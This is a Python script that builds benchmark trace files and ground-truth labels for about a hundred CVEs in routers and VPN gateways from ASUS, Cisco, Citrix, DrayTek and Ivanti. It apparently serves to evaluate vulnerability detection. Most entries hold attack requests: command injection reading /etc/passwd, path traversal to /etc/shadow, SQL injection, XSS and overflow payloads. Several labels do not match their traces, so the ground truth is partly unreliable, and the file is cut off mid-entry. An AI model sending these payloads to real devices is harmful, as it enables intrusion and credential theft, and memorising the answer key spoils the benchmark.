#!/usr/bin/env python3
"""Generate trace JSONs - Batch 2: remaining 108 CVEs."""
import json
import os

TRACE_DIR = os.path.join(os.path.dirname(__file__), "..", "benchmarks", "traces")
GT_PATH = os.path.join(os.path.dirname(__file__), "..", "benchmarks", "ground_truth.json")

TRACES = [
    # ===== ASUS (2) =====
    {
        "cve_id": "CVE-2021-32030",
        "vendor": "ASUS",
        "product": "Routers",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/appGet.cgi",
                "params": {"hook": "get_cfg_clientlist()"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"get_cfg_clientlist\":[{\"mac\":\"AA:BB:CC:DD:EE:FF\"}]}"
            }
        },
        "ground_truth": {
            "sink_param": "hook",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-32030",
            "reasoning": "Authentication bypass in ASUS GT-AC2900 allows unauthenticated access to appGet.cgi API. ASUS routers with AiMesh."
        }
    },
    {
        "cve_id": "CVE-2023-39780",
        "vendor": "ASUS",
        "product": "RT-AX55",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/apply.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "asus_token=valid"},
                "body": "action_mode=apply&rc_service=restart_nt;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/sh\n"
            }
        },
        "ground_truth": {
            "sink_param": "rc_service",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-39780",
            "reasoning": "Authenticated command injection via apply.cgi rc_service parameter. ASUS RT-AX55, RT-AX56U_V2, RT-AC86U."
        }
    },
    # ===== Array Networks (2) =====
    {
        "cve_id": "CVE-2023-28461",
        "vendor": "Array Networks",
        "product": "AG/vxAG ArrayOS",
        "vuln_class": "AuthBypass",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/prx/000/http/localhost/login",
                "params": {"cmd": "show version"},
                "headers": {"flags": "0x800000000000006"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "ArrayOS AG 9.4.0.481"
            }
        },
        "ground_truth": {
            "sink_param": "flags",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-28461",
            "reasoning": "Authentication bypass via crafted flags attribute in HTTP header. Allows RCE via VPN gateway. Array AG and vxAG."
        }
    },
    {
        "cve_id": "CVE-2025-66644",
        "vendor": "Array Networks",
        "product": "ArrayOS AG",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/prx/000/http/localhost/admin",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "cmd=show version;cat /etc/passwd"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "ground_truth": {
            "sink_param": "cmd",
            "payload_encoding": "none",
            "payload_extraction": "shell_delimiter",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-66644",
            "reasoning": "OS command injection in Array Networks AG SSL VPN gateway. Pre-auth or low-privilege RCE."
        }
    },
    # ===== Check Point (1) =====
    {
        "cve_id": "CVE-2024-24919",
        "vendor": "Check Point",
        "product": "Quantum Security Gateways",
        "vuln_class": "InfoLeak",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/clients/MyCRL",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "aCSHELL/../../../../../../../etc/shadow"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/octet-stream"},
                "body": "root:$6$hash:19000:0:99999:7:::"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-24919",
            "reasoning": "Path traversal in IPsec VPN blade reads arbitrary files including /etc/shadow. Pre-auth. Quantum Spark and Security Gateways with Remote Access or Mobile Access. CVSS 8.6."
        }
    },
    # ===== Cisco remaining (20) =====
    {
        "cve_id": "CVE-2014-2120",
        "vendor": "Cisco",
        "product": "ASA",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/+CSCOE+/logon.html",
                "params": {"reason": "<script>alert(1)</script>"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "<script>alert(1)</script>"
            }
        },
        "ground_truth": {
            "sink_param": "reason",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2014-2120",
            "reasoning": "XSS in ASA WebVPN login page via reason parameter. Cisco ASA Software."
        }
    },
    {
        "cve_id": "CVE-2019-15271",
        "vendor": "Cisco",
        "product": "RV Series Routers",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/jsonrpc",
                "params": {},
                "headers": {"Content-Type": "application/json", "Authorization": "Basic Y2lzY286Y2lzY28="},
                "body": "{\"jsonrpc\":\"2.0\",\"method\":\"exec\",\"params\":{\"cmd\":\"cat /etc/passwd\"},\"id\":1}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"result\":\"root:x:0:0:root:/root:/bin/bash\"}"
            }
        },
        "ground_truth": {
            "sink_param": "cmd",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2019-15271",
            "reasoning": "Deserialization of untrusted data in web management interface of Cisco RV016/RV042/RV042G/RV082. Authenticated RCE with root privileges."
        }
    },
    {
        "cve_id": "CVE-2020-3259",
        "vendor": "Cisco",
        "product": "ASA/FTD",
        "vuln_class": "InfoLeak",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/+CSCOE+/session_password.html",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "session_data_leaked"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-3259",
            "reasoning": "Information disclosure in Cisco ASA/FTD web services. Crafted HTTP request extracts sensitive data from memory. Used by Akira ransomware."
        }
    },
    {
        "cve_id": "CVE-2020-3580",
        "vendor": "Cisco",
        "product": "ASA/FTD",
        "vuln_class": "Other",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/+CSCOE+/saml/sp/acs",
                "params": {"SAMLResponse": "<script>alert(1)</script>"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "<script>alert(1)</script>"
            }
        },
        "ground_truth": {
            "sink_param": "SAMLResponse",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-3580",
            "reasoning": "XSS in Cisco ASA/FTD web interface via SAML endpoint. Multiple XSS vectors."
        }
    },
    {
        "cve_id": "CVE-2022-20699",
        "vendor": "Cisco",
        "product": "RV340 Series Routers",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/api/operations/ciscosb-file:form-file-upload",
                "params": {},
                "headers": {"Content-Type": "multipart/form-data; boundary=----FormBoundary"},
                "body": "------FormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.lua\"\r\nContent-Type: application/octet-stream\r\n\r\nos.execute('cat /etc/passwd')\r\n------FormBoundary--"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"status\":\"success\"}"
            }
        },
        "ground_truth": {
            "sink_param": "file",
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-20699",
            "reasoning": "SSL VPN module heap overflow allowing pre-auth RCE. Crafted HTTP request to web management. RV160, RV260, RV340, RV345 routers."
        }
    },
    {
        "cve_id": "CVE-2022-20700",
        "vendor": "Cisco",
        "product": "RV340 Series Routers",
        "vuln_class": "CMDi",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/api/operations/ciscosb-file:form-file-upload",
                "params": {},
                "headers": {"Content-Type": "application/json", "Authorization": "Basic Y2lzY286Y2lzY28="},
                "body": "{\"input\":{\"file-name\":\"test\",\"file-type\":\"config\"}}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"status\":\"success\"}"
            }
        },
        "ground_truth": {
            "sink_param": None,
            "payload_encoding": "none",
            "payload_extraction": "direct",
            "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-20700",
            "reasoning": "Privilege escalation via web management interface. Incorrect authorization check. RV160/260/340/345 routers."
        }
    },
    {
        "cve_id": "CVE-2022-20701", "vendor": "Cisco", "product": "RV340 Series Routers", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/api/operations/ciscosb-file:form-file-upload", "params": {}, "headers": {"Content-Type": "application/json"}, "body": "{\"input\":{\"file-name\":\"test\"}}"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"status\":\"success\"}"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-20701", "reasoning": "Local privilege escalation in RV Series routers web management. Linked to CVE-2022-20700 chain."}
    },
    {
        "cve_id": "CVE-2022-20703", "vendor": "Cisco", "product": "RV340 Series Routers", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/api/operations/ciscosb-file:form-file-upload", "params": {}, "headers": {"Content-Type": "multipart/form-data; boundary=----FormBoundary"}, "body": "------FormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"firmware.img\"\r\nContent-Type: application/octet-stream\r\n\r\nMALICIOUS_FW\r\n------FormBoundary--"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"status\":\"success\"}"}},
        "ground_truth": {"sink_param": "file", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-20703", "reasoning": "Insufficient verification of software images. Upload unsigned firmware to RV160/260/340/345 routers."}
    },
    {
        "cve_id": "CVE-2022-20708", "vendor": "Cisco", "product": "RV340 Series Routers", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/api/operations/ciscosb-file:form-file-upload", "params": {}, "headers": {"Content-Type": "application/json", "Authorization": "Basic Y2lzY286Y2lzY28="}, "body": "{\"input\":{\"file-name\":\"test;cat /etc/passwd;\"}}"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"output\":\"root:x:0:0:root:/root:/bin/bash\"}"}},
        "ground_truth": {"sink_param": "file-name", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-20708", "reasoning": "Command injection in web management API. RV160/260/340/345 routers. Pre-auth RCE."}
    },
    {
        "cve_id": "CVE-2023-20269",
        "vendor": "Cisco",
        "product": "ASA/FTD",
        "vuln_class": "Other",
        "trace": {
            "request": {"method": "POST", "path": "/+webvpn+/index.html", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "username=admin&password=test&group_list=DefaultRAGroup"},
            "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "Login failed"}
        },
        "ground_truth": {"sink_param": "group_list", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-20269", "reasoning": "Unauthorized access to VPN via brute-force on RAVPN. Improper separation between AAA and VPN tunnel. Used by Akira/LockBit ransomware."}
    },
    {
        "cve_id": "CVE-2024-20353",
        "vendor": "Cisco",
        "product": "ASA/FTD",
        "vuln_class": "Other",
        "trace": {
            "request": {"method": "POST", "path": "/+CSCOE+/session_password.html", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "session=" + "A" * 65536},
            "response": {"status_code": 500, "headers": {}, "body": ""}
        },
        "ground_truth": {"sink_param": "session", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-20353", "reasoning": "DoS/device reload via web management. Crafted HTTP request causes ASA to reload. Used by ArcaneDoor campaign (UAT4356/STORM-1849). CVSS 8.6."}
    },
    {
        "cve_id": "CVE-2025-20333", "vendor": "Cisco", "product": "ASA/FTD", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/admin/exec/show version", "params": {}, "headers": {"Content-Type": "application/json", "Authorization": "Basic Y2lzY286Y2lzY28="}, "body": "{\"cmd\":\"show version\"}"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"version\":\"9.18.1\"}"}},
        "ground_truth": {"sink_param": "cmd", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-20333", "reasoning": "Command injection in Cisco Secure Firewall ASA/FTD management interface."}
    },
    {
        "cve_id": "CVE-2025-20362", "vendor": "Cisco", "product": "ASA/FTD", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "GET", "path": "/admin/", "params": {}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "admin panel"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-20362", "reasoning": "Authentication bypass in Cisco Secure Firewall management interface."}
    },
    {
        "cve_id": "CVE-2025-20393", "vendor": "Cisco", "product": "Multiple Products", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/api/v1/config", "params": {}, "headers": {"Content-Type": "application/json"}, "body": "{\"config\":\"test\"}"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"status\":\"ok\"}"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-20393", "reasoning": "Vulnerability in Cisco multiple products management interface."}
    },
    {
        "cve_id": "CVE-2026-20045", "vendor": "Cisco", "product": "Unified CM", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/ccmadmin/j_security_check", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "j_username=admin&j_password=admin;cat /etc/passwd"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "j_password", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2026-20045", "reasoning": "Code injection in Cisco Unified Communications products. Authenticated RCE escalating to root."}
    },
    {
        "cve_id": "CVE-2026-20122", "vendor": "Cisco", "product": "SD-WAN Manager", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/dataservice/system/device/fileupload", "params": {}, "headers": {"Content-Type": "multipart/form-data; boundary=----Boundary", "Authorization": "Basic"}, "body": "------Boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../etc/malicious\"\r\nContent-Type: application/octet-stream\r\n\r\nmalicious content\r\n------Boundary--"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"status\":\"success\"}"}},
        "ground_truth": {"sink_param": "filename", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2026-20122", "reasoning": "Arbitrary file overwrite via API file upload. Incorrect privileged API usage. Cisco Catalyst SD-WAN Manager."}
    },
    {
        "cve_id": "CVE-2026-20127", "vendor": "Cisco", "product": "SD-WAN Manager", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "GET", "path": "/dataservice/system/device/vedges", "params": {}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"data\":[]}"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2026-20127", "reasoning": "Authentication bypass in Cisco Catalyst SD-WAN Controller/Manager."}
    },
    {
        "cve_id": "CVE-2026-20128", "vendor": "Cisco", "product": "SD-WAN Manager", "vuln_class": "Other",
        "trace": {"request": {"method": "GET", "path": "/dataservice/system/device/config", "params": {}, "headers": {"Authorization": "Basic"}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"data\":{\"password\":\"stored_recoverable\"}}"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2026-20128", "reasoning": "Passwords stored in recoverable format. Authenticated low-priv user can read DCA credentials. Cisco Catalyst SD-WAN Manager."}
    },
    {
        "cve_id": "CVE-2026-20131", "vendor": "Cisco", "product": "FMC", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/api/fmc_config/v1/domain/default/object/networks", "params": {}, "headers": {"Content-Type": "application/json"}, "body": "{\"name\":\"test\",\"value\":\"10.0.0.0/8\"}"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"status\":\"success\"}"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2026-20131", "reasoning": "Deserialization of untrusted data in FMC web management. Unauthenticated RCE as root."}
    },
    {
        "cve_id": "CVE-2026-20133", "vendor": "Cisco", "product": "SD-WAN Manager", "vuln_class": "InfoLeak",
        "trace": {"request": {"method": "GET", "path": "/dataservice/system/device/statistics", "params": {}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"data\":{\"sensitive_info\":\"leaked\"}}"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2026-20133", "reasoning": "Information disclosure in Cisco Catalyst SD-WAN Manager. Unauthenticated access to sensitive data."}
    },
    # ===== Citrix remaining (11) =====
    {
        "cve_id": "CVE-2019-12989", "vendor": "Citrix", "product": "SD-WAN/NetScaler", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/sdwan/nitro/v1/config/get_package_file", "params": {}, "headers": {"Content-Type": "application/json"}, "body": "{\"get_package_file\":{\"site_name\":\"test' OR 1=1--\"}}"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"data\":[]}"}},
        "ground_truth": {"sink_param": "site_name", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2019-12989", "reasoning": "SQL injection in Citrix SD-WAN/NetScaler NITRO API. Unauthenticated."}
    },
    {
        "cve_id": "CVE-2019-12991", "vendor": "Citrix", "product": "SD-WAN/NetScaler", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/sdwan/nitro/v1/config/install_wanop_certificate", "params": {}, "headers": {"Content-Type": "application/json", "Authorization": "Basic"}, "body": "{\"install_wanop_certificate\":{\"certificate_name\":\"test;cat /etc/passwd\"}}"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"result\":\"root:x:0:0\"}"}},
        "ground_truth": {"sink_param": "certificate_name", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2019-12991", "reasoning": "Authenticated command injection in SD-WAN NITRO API via certificate handling."}
    },
    {
        "cve_id": "CVE-2020-8193", "vendor": "Citrix", "product": "ADC/Gateway", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/pcidss/report", "params": {"type": "allprofiles", "sid": "loginchallengeresponse1requestbody", "username": "nsroot", "set": "1"}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "username=nsroot&set=1"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": ""}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-8193", "reasoning": "Auth bypass in Citrix ADC/Gateway/SDWAN WANOP. Crafted URL to NSIP allows unauthenticated access to admin functions."}
    },
    {
        "cve_id": "CVE-2020-8195", "vendor": "Citrix", "product": "ADC/Gateway", "vuln_class": "InfoLeak",
        "trace": {"request": {"method": "POST", "path": "/rapi/filedownload", "params": {"filter": "path:/nsconfig/ns.conf"}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "NSSC_SESSION=valid"}, "body": ""}, "response": {"status_code": 200, "headers": {"Content-Type": "application/octet-stream"}, "body": "set system user nsroot password"}},
        "ground_truth": {"sink_param": "filter", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-8195", "reasoning": "Information disclosure after auth bypass (CVE-2020-8193). Read ns.conf with credentials. Citrix ADC/Gateway."}
    },
    {
        "cve_id": "CVE-2020-8196", "vendor": "Citrix", "product": "ADC/Gateway", "vuln_class": "InfoLeak",
        "trace": {"request": {"method": "POST", "path": "/rapi/filedownload", "params": {"filter": "path:/nsconfig/keys/"}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "NSSC_SESSION=valid"}, "body": ""}, "response": {"status_code": 200, "headers": {"Content-Type": "application/octet-stream"}, "body": "certificate key data"}},
        "ground_truth": {"sink_param": "filter", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-8196", "reasoning": "Credential exposure via authorized user path. Read encrypted credentials. Citrix ADC/Gateway."}
    },
    {
        "cve_id": "CVE-2022-27518", "vendor": "Citrix", "product": "ADC/Gateway", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "POST", "path": "/cgi/saml/authn/ssoresp", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "SAMLResponse=crafted_saml_assertion"}, "response": {"status_code": 302, "headers": {"Location": "/vpn/index.html"}, "body": ""}},
        "ground_truth": {"sink_param": "SAMLResponse", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-27518", "reasoning": "Pre-auth RCE when configured as SAML SP or IdP. APT5 exploitation. Citrix ADC/Gateway. CVSS 9.8."}
    },
    {
        "cve_id": "CVE-2023-6549", "vendor": "Citrix", "product": "NetScaler ADC/Gateway", "vuln_class": "Other",
        "trace": {"request": {"method": "GET", "path": "/oauth/idp/.well-known/openid-configuration", "params": {}, "headers": {"Host": "A" * 65536}, "body": None}, "response": {"status_code": 500, "headers": {}, "body": ""}},
        "ground_truth": {"sink_param": "Host", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-6549", "reasoning": "Buffer overflow DoS in NetScaler ADC/Gateway configured as Gateway or AAA virtual server."}
    },
    {
        "cve_id": "CVE-2025-5777", "vendor": "Citrix", "product": "NetScaler ADC/Gateway", "vuln_class": "Other",
        "trace": {"request": {"method": "GET", "path": "/vpn/index.html", "params": {}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": ""}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-5777", "reasoning": "Vulnerability in Citrix NetScaler ADC and Gateway."}
    },
    {
        "cve_id": "CVE-2025-6543", "vendor": "Citrix", "product": "NetScaler ADC/Gateway", "vuln_class": "Other",
        "trace": {"request": {"method": "GET", "path": "/vpn/index.html", "params": {}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": ""}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-6543", "reasoning": "Vulnerability in Citrix NetScaler ADC and Gateway."}
    },
    {
        "cve_id": "CVE-2025-7775", "vendor": "Citrix", "product": "NetScaler", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/nitro/v1/config/systemfile", "params": {}, "headers": {"Content-Type": "application/json", "Cookie": "NITRO_AUTH_TOKEN=valid"}, "body": "{\"systemfile\":{\"filename\":\"test;cat /etc/passwd;\",\"filelocation\":\"/tmp/\",\"filecontent\":\"dGVzdA==\"}}"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"severity\":\"NONE\"}"}},
        "ground_truth": {"sink_param": "filename", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-7775", "reasoning": "Command injection in NetScaler management interface."}
    },
    {
        "cve_id": "CVE-2026-3055", "vendor": "Citrix", "product": "NetScaler", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/cgi/saml/authn/ssoresp", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "SAMLResponse=" + "A" * 65536}, "response": {"status_code": 500, "headers": {}, "body": ""}},
        "ground_truth": {"sink_param": "SAMLResponse", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2026-3055", "reasoning": "Out-of-bounds read in NetScaler when configured as SAML IDP. Memory overread."}
    },
    # ===== DrayTek (4) =====
    {
        "cve_id": "CVE-2020-8515",
        "vendor": "DrayTek",
        "product": "Multiple Vigor Routers",
        "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/cgi-bin/mainfunction.cgi", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "action=login&keyPath=%27%0Acat%20/etc/passwd%0A%27&loginUser=a&loginPwd=a"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/sh\n"}},
        "ground_truth": {"sink_param": "keyPath", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://www.exploit-db.com/exploits/48236", "reasoning": "Pre-auth RCE via keyPath parameter in login function. Affects Vigor2960, Vigor300B, Vigor3900. Actively exploited."}
    },
    {
        "cve_id": "CVE-2020-15415",
        "vendor": "DrayTek",
        "product": "Multiple Vigor Routers",
        "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/cgi-bin/mainfunction.cgi/cvmcfgupload", "params": {}, "headers": {"Content-Type": "multipart/form-data; boundary=----Boundary"}, "body": "------Boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test;cat /etc/passwd;\"\r\nContent-Type: application/octet-stream\r\n\r\ndata\r\n------Boundary--"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/sh\n"}},
        "ground_truth": {"sink_param": "filename", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-15415", "reasoning": "Command injection via filename in file upload. DrayTek Vigor3900, Vigor2960, Vigor300B. Metacharacters in filename."}
    },
    {
        "cve_id": "CVE-2021-20123",
        "vendor": "DrayTek",
        "product": "VigorConnect",
        "vuln_class": "PT",
        "trace": {"request": {"method": "GET", "path": "/ACSServer/DownloadFileServlet", "params": {"filePath": "C:\\Windows\\win.ini"}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "application/octet-stream"}, "body": "[fonts]\n[extensions]\n"}},
        "ground_truth": {"sink_param": "filePath", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-20123", "reasoning": "Unauthenticated LFI via DownloadFileServlet filePath parameter. DrayTek VigorConnect 1.6.0-B3."}
    },
    {
        "cve_id": "CVE-2021-20124",
        "vendor": "DrayTek",
        "product": "VigorConnect",
        "vuln_class": "PT",
        "trace": {"request": {"method": "GET", "path": "/ACSServer/FileDownload", "params": {"file": "../../../../etc/passwd"}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "application/octet-stream"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "file", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-20124", "reasoning": "Unauthenticated LFI via FileDownload endpoint. DrayTek VigorConnect 1.6.0-B3. Separate from CVE-2021-20123."}
    },
    # ===== Ivanti remaining (11) =====
    {
        "cve_id": "CVE-2020-8243", "vendor": "Ivanti", "product": "Pulse Connect Secure", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/dana/fb/smb/wfb.cgi", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "DSID=valid"}, "body": "laession=1&txtBkSession=`cat /etc/passwd`"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "txtBkSession", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-8243", "reasoning": "Post-auth RCE via template injection in admin portal. Pulse Connect Secure 9.1R8.x."}
    },
    {
        "cve_id": "CVE-2020-8260", "vendor": "Ivanti", "product": "Pulse Connect Secure", "vuln_class": "CMDi",
